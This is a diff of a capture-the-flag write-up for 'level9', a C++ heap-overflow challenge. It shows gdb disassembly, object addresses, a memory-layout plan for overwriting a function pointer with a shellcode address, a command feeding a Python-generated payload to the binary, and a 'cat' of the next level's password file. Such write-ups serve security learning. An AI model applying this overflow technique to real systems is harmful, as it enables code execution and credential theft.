@@ -1,16 +1,69 @@
-sizeof(this) = 0x6c = 108
-this+0x6c = this00-4
+# level9
 
-| this (size 0x6c) | |  this00 (size 0x6c)  |
-| func | buff | id | | func  |  buff   | id |
-|   4  |  100 |  4 |4|   4   |  100    | 4  |
-|      |AAAAAA|AAAA|A|804a078|shellcode|    |
-|      |     0x6c    |                      |
+- In this level we have a class `n` with 3 vars func, buff, nb
 
-writing "A"*6c at this->buf (this+4)
-writing this00->buff addr to this->func
-writing shellcode to this00->buff
+- ```gdb
+  (gdb) disass main
+  Dump of assembler code for function main:
+    [...]
+    0x0804861e <+42>:	movl   $0x5,0x4(%esp)
+    0x08048626 <+50>:	mov    %ebx,(%esp)
+    0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
+    0x0804862e <+58>:	mov    %ebx,0x1c(%esp)
+    0x08048632 <+62>:	movl   $0x6c,(%esp)
+    0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
+    0x0804863e <+74>:	mov    %eax,%ebx
+    0x08048640 <+76>:	movl   $0x6,0x4(%esp)
+    0x08048648 <+84>:	mov    %ebx,(%esp)
+    0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
+    0x08048650 <+92>:	mov    %ebx,0x18(%esp)
+    0x08048654 <+96>:	mov    0x1c(%esp),%eax
+    [...]
+  End of assembler dump.
 
-so when this00->func is call it execute shellcode at this->buff
+  (gdb) b *0x0804862e
+  (gdb) b *0x08048650
+  (gdb) r test
+  Breakpoint 1, 0x0804862e in main ()
+  (gdb) info reg
+  eax            0x804a008	134520840
+  [...]
+  (gdb) c
+  Breakpoint 2, 0x08048650 in main ()
+  (gdb) info reg
+  eax            0x804a078	134520952
+  ```
+
+- N1 = `0x804a008` | N2 = `0x804a078`
+
+- The 2 vars in memory look like this :
+
+  |  N1  (size 0x6c) | |   N2  (size 0x6c)    |
+  | func | buff | nb | | func  |  buff   | nb |
+  |   4  |  100 |  4 |4|   4   |  100    | 4  |
+
+  sizeof(N1) = 0x6c = 108
+  N1+0x6c = N2-4
+
+- When `setAnnotation` is called on N1 we need to override the func addr of N2, just before the func call in the return line
+
+- We can write like this :
+  writing "A"*6c at N1->buf (N1+4)
+  writing N2->buff addr to N2->func
+  writing shellcode to N2->buff
+
+- The memory look like this :
+  |  N1  (size 0x6c) | |   N2  (size 0x6c)    |
+  | func | buff | nb | | func  |  buff   | nb |
+  |   4  |  100 |  4 |4|   4   |  100    | 4  |
+  |      |AAAAAA|AAAA|A|804a078|shellcode|    |
+  |      |     0x6c    |                      |
+
+
+- So when N2->func is call it execute shellcode at N2->buff
+
+- ```sh
+  ./level9 `python /tmp/level9.py`
+  ```
 
 cat /home/user/bonus0/.pass
